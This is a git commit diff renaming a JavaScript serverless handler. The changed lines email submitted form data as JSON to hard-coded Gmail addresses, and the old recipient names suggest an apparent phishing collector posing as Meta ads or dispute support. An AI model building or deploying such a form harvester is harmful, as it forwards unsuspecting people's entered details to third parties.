b2232ef5632762e080d1b94270b28997a862dca8
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-03-28 14:03:23 +0500

    Update and rename aftab.js to nanu.js

--- nanu.js
+++ nanu.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,metaadsonline.official@gmail.com",
-      subject: "Aftab",
+      to: "ta0134750@gmail.com,ssamimali858@gmail.com",
+      subject: "nanu",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
